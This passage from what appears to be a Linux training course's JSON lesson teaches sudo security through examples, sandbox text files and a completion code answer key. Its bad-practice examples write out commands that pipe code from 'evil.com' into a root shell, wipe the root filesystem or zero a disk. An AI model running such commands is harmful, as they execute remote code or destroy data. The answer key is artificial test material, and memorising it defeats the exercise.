mistake (2000s):**\n   ```bash\n   sudo firefox\n   ```\n   Creates root-owned files in ~/\n   Can't access your own files afterward\n   Firefox plugins run as root (dangerous)\n   \n3. **The sudoers typo (ongoing):**\n   Editing /etc/sudoers incorrectly can lock everyone out\n   Must use `visudo` command (validates syntax)\n   \n4. **CVE-2019-14287 (2019):**\n   sudo vulnerability allowed users to run commands as root\n   Even when explicitly denied\n   Affected sudo versions < 1.8.28\n\n**Modern sudo security (2010s-present):**\n\n1. **SELinux/AppArmor integration:**\n   Additional mandatory access control\n   Even root is restricted by policy\n   \n2. **sudo logging to syslog:**\n   Centralized logging for auditing\n   Can't be hidden by attacker\n   \n3. **Two-factor authentication:**\n   Some systems require 2FA for sudo\n   Extra security layer\n   \n4. **Insults mode (fun security feature):**\n   ```bash\n   Defaults insults\n   ```\n   Wrong password gets insulted:\n   \"Your mind just hasn't been the same since the electro-shock, has it?\"\n   Makes brute-force attacks more annoying\n\n**Best practices emerged:**\n- Use sudo for individual commands only\n- Never `curl | sudo bash`\n- Review sudo logs regularly  \n- Limit sudo access via /etc/sudoers\n- Use `sudo -v` to refresh timeout\n- Never run GUI apps with sudo\n- Think before typing destructive commands",
        "example": "```bash\n# ✅ GOOD: Secure sudo practices\n\n# 1. Use sudo for single command\nsudo systemctl restart nginx\n# Back to regular user immediately\n\n# 2. Verify before destructive operations\nls /var/log/old/\n# Check what you're about to delete\nsudo rm -rf /var/log/old/\n\n# 3. Use sudo -v to refresh timeout\nsudo -v\n# Extends credential cache without running command\n\n# 4. Review before running scripts\ncurl -O https://site.com/script.sh\ncat script.sh              # Review it!\nchmod +x script.sh\nsudo ./script.sh           # Run only if safe\n\n# 5. Check sudo logs\nsudo grep sudo /var/log/auth.log | tail -20\n\n# ❌ BAD: Dangerous sudo practices\n\n# 1. Don't pipe untrusted input to sudo\ncurl http://evil.com/script.sh | sudo bash  # ❌ DANGEROUS!\n\n# 2. Don't run GUI apps with sudo\nsudo firefox               # ❌ Security risk\nsudo gedit ~/.bashrc       # ❌ Creates root-owned file\n\n# 3. Don't stay as root\nsudo -i                    # ❌ Full root shell\n# ... hours later, still root ...\nrm -rf /var /log           # ❌ Typo destroys system!\n\n# 4. Don't use sudo unnecessarily\nsudo vim ~/.bashrc         # ❌ File in your home!\nvim ~/.bashrc              # ✓ Regular user\n\n# 5. Don't ignore warnings\nsudo rm -rf /              # ❌ System warns, then deletes EVERYTHING\n```",
        "commonUses": [
          "**Audit sudo logs** - Review /var/log/auth.log for security",
          "**Configure sudoers** - Control who can run what with sudo",
          "**Monitor sudo usage** - Detect unauthorized access attempts",
          "**Secure administrative tasks** - Limit damage from mistakes",
          "**Compliance** - Meet security standards (PCI-DSS, SOX, etc.)"
        ]
      },
      "hints": [
        "Read about sudo security principles",
        "Review common security mistakes",
        "The completion code is in the security guide"
      ],
      "sandbox": {
        "startDir": "workspace",
        "dirs": ["workspace"],
        "files": {
          "workspace/task.txt": "Task: Learn about sudo security best practices\n\n1. Read the principles: cat security-principles.txt\n2. Review common mistakes: cat common-mistakes.txt\n3. Study the security guide: cat security-guide.txt\n4. Find the completion code\n\nSecurity is critical when using sudo.\nOne mistake can compromise or destroy the entire system.",
          "workspace/security-principles.txt": "sudo Security Principles\n========================\n\n1. Principle of Least Privilege\n--------------------------------\n\nRun with minimum necessary permissions:\n\n❌ Bad:\n  sudo -i              # Become root\n  # ... work for hours as root ...\n  \n✓ Good:\n  sudo command         # Run one command\n  # Immediately back to regular user\n\nWhy it matters:\n  - Limits damage from mistakes\n  - Reduces attack surface\n  - Easier to audit (specific commands vs. entire session)\n\n2. Defense in Depth\n-------------------\n\nMultiple security layers:\n\n  Layer 1: User authentication (password)\n  Layer 2: sudo authorization (sudoers file)\n  Layer 3: Command execution (SELinux/AppArmor)\n  Layer 4: Logging (audit trail)\n  Layer 5: File permissions (chmod/chown)\n\nIf one layer fails, others protect the system.\n\n3. Accountability\n-----------------\n\nKnow who did what:\n\n  /var/log/auth.log:\n  Dec 31 10:30:15 alice : TTY=pts/0 ; PWD=/home/alice ;\n  USER=root ; COMMAND=/bin/systemctl restart nginx\n\nEach admin:\n  - Uses own account (not shared)\n  - Uses own password (not root's)\n  - Actions logged with username\n  - Can be audited and held responsible\n\n4. Think Before You Type\n------------------------\n\nWith great power comes great responsibility:\n\n  sudo rm -rf /var/log/*     # Check path!\n  sudo chmod -R 777 /        # Verify target!\n  sudo chown -R www-data /   # Confirm directory!\n\nOne typo can:\n  - Delete entire system\n  - Break all permissions\n  - Make system unbootable\n  - Expose all data\n\n5. Fail Secure\n--------------\n\nWhen in doubt, be restrictive:\n\n  ❌ sudo chmod 777 file     # Too permissive\n  ✓ sudo chmod 644 file      # Minimal necessary\n  \n  ❌ sudo chown :users /etc  # Too broad\n  ✓ sudo chown :users /data  # Specific location\n\nIt's easier to add permissions than fix compromised system.\n\n6. Audit and Monitor\n--------------------\n\nRegularly review sudo usage:\n\n  # Who used sudo recently?\n  sudo grep sudo /var/log/auth.log | tail -50\n  \n  # Failed sudo attempts (possible attack)?\n  sudo grep \"authentication failure\" /var/log/auth.log\n  \n  # Unusual commands?\n  sudo grep \"COMMAND=\" /var/log/auth.log | grep -v \"apt\\|systemctl\"\n\nSee common-mistakes.txt for what to avoid.",
          "workspace/common-mistakes.txt": "Common sudo Security Mistakes\n==============================\n\n1. Running Untrusted Code\n-------------------------\n\n❌ EXTREMELY DANGEROUS:\n\n  curl http://site.com/install.sh | sudo bash\n  wget -O - http://site.com/setup.sh | sudo sh\n\nWhy it's dangerous:\n  - Downloads random code from internet\n  - Executes it as root (unlimited power)\n  - No review, no verification\n  - Could install backdoor, steal data, destroy system\n  \n✓ SAFER:\n\n  curl -O http://site.com/install.sh\n  cat install.sh              # REVIEW IT!\n  # Read the code, understand what it does\n  chmod +x install.sh\n  sudo ./install.sh           # Run only if safe\n\n2. Running GUI Applications\n---------------------------\n\n❌ BAD:\n\n  sudo firefox\n  sudo gedit ~/.bashrc\n  sudo nautilus\n\nWhy it's bad:\n  - Creates root-owned files in ~/\n  - You can't edit your own files afterward\n  - GUI plugins/extensions run as root\n  - Security vulnerabilities have root access\n  - X11/Wayland permission issues\n  \n✓ GOOD:\n\n  firefox                     # Regular user\n  gedit ~/.bashrc             # Regular user\n  \n  # If you need to edit system files:\n  sudoedit /etc/nginx/nginx.conf\n  # or\n  sudo vim /etc/nginx/nginx.conf\n\n3. Staying as Root\n------------------\n\n❌ BAD:\n\n  sudo -i                     # Become root\n  # ... hours of work ...\n  rm -rf /var /log           # Typo: space after /var\n  # DISASTER: Deletes /var AND /log AND root /!\n  \n✓ GOOD:\n\n  sudo command1               # Run command\n  sudo command2               # Run command\n  # Each command individually\n  # Back to regular user between commands\n\n4. Using sudo Unnecessarily\n---------------------------\n\n❌ BAD:\n\n  sudo vim ~/.bashrc          # File in YOUR home\n  sudo mkdir ~/projects       # Your own directory\n  sudo ./my-script.sh         # Your own script\n\nProblems:\n  - Creates root-owned files in ~/\n  - Can't access them as regular user\n  - No security benefit\n  - Adds unnecessary risk\n  \n✓ GOOD:\n\n  vim ~/.bashrc               # Regular user\n  mkdir ~/projects            # Regular user\n  ./my-script.sh              # Regular user\n\nRule: Only use sudo for SYSTEM tasks!\n\n5. Typos in Destructive Commands\n---------------------------------\n\n❌ CATASTROPHIC:\n\n  sudo rm -rf /var/log/*      # Intended: delete log files\n  sudo rm -rf /var/log /*     # Actual: space before /* = delete root!\n  \n  sudo rm -rf / var/log       # Missing slash: deletes root!\n  \n  sudo chmod -R 777 /         # Typo: makes ENTIRE system writable\n\nReal incidents:\n  - GitLab outage (2017): rm -rf deleted production database\n  - Toy Story 2 (1998): rm -rf almost deleted entire movie\n  - Many companies: chmod -R broke entire system\n  \n✓ SAFER:\n\n  # 1. Check the path first\n  ls /var/log/*\n  # Verify what will be deleted\n  \n  # 2. Use less destructive commands first\n  mv /var/log/* /tmp/backup/\n  # Can recover if mistake\n  \n  # 3. Double-check command before Enter\n  sudo rm -rf /var/log/*\n  # Read it twice, execute once\n\n6. Ignoring Warnings\n--------------------\n\n❌ BAD:\n\n  sudo rm -rf /\n  rm: it is dangerous to operate recursively on '/'\n  rm: use --no-preserve-root to override this failsafe\n  \n  # User thinks: \"I know what I'm doing\"\n  sudo rm -rf --no-preserve-root /\n  # System destroyed!\n  \n✓ GOOD:\n\n  # If system warns you, STOP\n  # Re-think what you're doing\n  # Check the command\n  # Verify the path\n\n7. Broad sudo Access\n--------------------\n\n❌ BAD /etc/sudoers:\n\n  intern ALL=(ALL) NOPASSWD: ALL\n  # Intern can run ANY command as root\n  # No password required\n  # Recipe for disaster\n  \n✓ GOOD /etc/sudoers:\n\n  developer ALL=(ALL) /usr/bin/systemctl restart nginx\n  developer ALL=(ALL) /usr/bin/systemctl status nginx\n  # Developer can only restart/check nginx\n  # Nothing else\n  # Limited blast radius\n\n8. Not Reviewing Logs\n---------------------\n\n❌ BAD:\n\n  # Never check /var/log/auth.log\n  # Attacker uses sudo for weeks\n  # No one notices\n  \n✓ GOOD:\n\n  # Weekly review:\n  sudo grep sudo /var/log/auth.log | tail -100\n  \n  # Look for:\n  # - Failed attempts (brute force?)\n  # - Unusual commands\n  # - Unknown users\n  # - Off-hours usage\n\nSee security-guide.txt for best practices.",
          "workspace/security-guide.txt": "sudo Security Best Practices Guide\n===================================\n\nDaily Practices:\n----------------\n\n1. Use sudo sparingly\n   Only when truly needed for system tasks\n   \n2. One command at a time\n   sudo command\n   # Back to regular user\n   \n3. Verify before executing\n   # Check paths, especially with rm/chmod/chown\n   \n4. Use absolute paths\n   sudo /usr/bin/systemctl restart nginx\n   # Prevents PATH hijacking\n\nCommand Safety:\n---------------\n\n**Destructive commands - Extra care:**\n\n  rm -rf      # Delete files\n  chmod -R    # Change permissions\n  chown -R    # Change ownership\n  dd          # Write directly to disk\n  mkfs        # Format filesystem\n  fdisk       # Partition disk\n\nBefore running:\n  1. Check the path\n  2. Verify the target\n  3. Have a backup\n  4. Test without sudo first (if possible)\n  5. Double-check command\n  6. Execute\n\n**Safe pattern:**\n\n  # List first\n  ls /var/log/old/\n  \n  # Verify target\n  echo \"Will delete: /var/log/old/*\"\n  \n  # Delete\n  sudo rm -rf /var/log/old/*\n\nScript Safety:\n---------------\n\nWhen running scripts with sudo:\n\n  # ❌ DON'T: Blind execution\n  curl http://site.com/install | sudo bash\n  \n  # ✓ DO: Review first\n  curl -O http://site.com/install.sh\n  \n  # Read the script\n  cat install.sh\n  less install.sh\n  \n  # Check for suspicious:\n  # - curl/wget (downloads more code)\n  # - rm -rf (deletes files)\n  # - chmod 777 (opens permissions)\n  # - Unknown URLs\n  # - Obfuscated code\n  \n  # If safe, run:\n  chmod +x install.sh\n  sudo ./install.sh\n\nLog Monitoring:\n---------------\n\n**Daily checks:**\n\n  # Recent sudo usage\n  sudo grep sudo /var/log/auth.log | tail -50\n  \n  # Failed attempts (attacks?)\n  sudo grep \"sudo.*authentication failure\" /var/log/auth.log\n  \n  # Unusual commands\n  sudo grep COMMAND /var/log/auth.log | grep -v \"apt\\|systemctl\"\n\n**What to look for:**\n\n  ✓ Normal:\n    alice sudo: systemctl restart nginx\n    bob sudo: apt update\n    \n  ⚠ Suspicious:\n    unknown_user sudo: bash\n    alice sudo: chmod 777 /\n    bob sudo: dd if=/dev/zero of=/dev/sda\n    3AM sudo: curl http://evil.com | bash\n\n**Set up alerts:**\n\n  # Monitor for failed sudo\n  # Email on suspicious commands\n  # Alert on after-hours usage\n\nAccess Control:\n---------------\n\n**Limit who has sudo:**\n\n  # Only add trusted users to sudo group\n  sudo usermod -aG sudo alice\n  \n  # Review sudo group members\n  getent group sudo\n\n**Fine-grained sudoers:**\n\n  # Edit with visudo (validates syntax)\n  sudo visudo\n  \n  # Allow specific commands only:\n  developer ALL=(ALL) /usr/bin/systemctl restart nginx\n  developer ALL=(ALL) /usr/bin/systemctl status nginx\n  \n  # No password for specific commands:\n  deploy ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart myapp\n  \n  # Deny everything else (implicit)\n\nPassword Policy:\n----------------\n\n  # Require password (default):\n  Defaults timestamp_timeout=15\n  # Re-prompt after 15 minutes\n  \n  # Require password every time:\n  Defaults timestamp_timeout=0\n  # More secure, less convenient\n  \n  # Longer timeout (less secure):\n  Defaults timestamp_timeout=60\n  # 60 minutes - only for trusted environments\n\nEmergency Procedures:\n---------------------\n\n**If you made a mistake:**\n\n1. Don't panic\n2. Assess damage\n3. Check if recoverable\n4. Restore from backup if needed\n5. Document what happened\n6. Learn from it\n\n**Common mistakes and fixes:**\n\n  Mistake: sudo vim ~/.bashrc\n  Problem: File now owned by root\n  Fix: sudo chown $USER:$USER ~/.bashrc\n  \n  Mistake: sudo chmod 777 /etc\n  Problem: System insecure\n  Fix: Restore from backup\n       Or: sudo chmod 755 /etc\n            (But may need to fix individual files)\n  \n  Mistake: sudo rm -rf important/\n  Problem: Files deleted\n  Fix: Restore from backup\n       (This is why backups exist!)\n\nCompliance:\n-----------\n\nMany standards require sudo auditing:\n\n  - PCI-DSS: Log all privileged access\n  - HIPAA: Audit administrative actions\n  - SOX: Track who changed what\n  - ISO 27001: Monitor privileged users\n  \nEnsure:\n  ✓ sudo logs enabled\n  ✓ Logs centralized (syslog)\n  ✓ Logs retained (90+ days)\n  ✓ Logs reviewed regularly\n  ✓ Alerts for suspicious activity\n\nPenetration Testing:\n--------------------\n\nTest your sudo security:\n\n  1. Try to escalate privileges\n  2. Check for misconfigured sudoers\n  3. Test sudo vulnerabilities\n  4. Verify logging works\n  5. Confirm alerts fire\n  \nCommon findings:\n  - NOPASSWD too permissive\n  - Sudo group too broad\n  - Logs not monitored\n  - Old sudo version (CVEs)\n\nQuick Security Checklist:\n-------------------------\n\n  ☐ Only trusted users have sudo\n  ☐ sudoers file properly configured\n  ☐ Logs are enabled and monitored\n  ☐ Alerts set up for suspicious activity\n  ☐ sudo version up to date\n  ☐ Users trained on sudo security\n  ☐ Regular log reviews scheduled\n  ☐ Incident response plan exists\n  ☐ Backups are current (in case of mistake)\n  ☐ Testing done regularly\n\n================================================\nCOMPLETION CODE: SUDO-SECURITY-EXPERT\n================================================\n\nKey Security Principles:\n------------------------\n\n1. Least Privilege - Minimum necessary access\n2. Defense in Depth - Multiple security layers\n3. Accountability - Know who did what\n4. Think Before You Type - Verify destructive commands\n5. Fail Secure - When in doubt, be restrictive\n6. Audit and Monitor - Review logs regularly\n\nRemember:\n  sudo is powerful but dangerous\n  One mistake can destroy the system\n  Great power = great responsibility\n  \nAlways:\n  ✓ Use sudo only when necessary\n  ✓ Verify commands before executing\n  ✓ Monitor logs for suspicious activity\n  ✓ Have backups ready\n  ✓ Learn from mistakes"
        }
      },
      "instructions": "## Your Task\n\nLearn about sudo security best practices and common mistakes.\n\n**Steps:**\n1. Read the task: `cat task.txt`\n2. Review principles: `cat security-principles.txt`\n3. Study common mistakes: `cat common-mistakes.txt`\n4. Read the security guide: `cat security-guide.txt`\n5. Find and copy the completion code\n6. Type `exit` and paste the code\n\n**Learn:** sudo security is critical. Use least privilege, think before you type, monitor logs, and avoid common mistakes. One error can destroy the entire system.",
      "requirements": [
        {
          "type": "command_output",
          "description": "The completion code from the security guide",
          "validator": "exact",
          "expected": "SUDO-SECURITY-EXPERT"
        }
      ]
    }
  ]
}
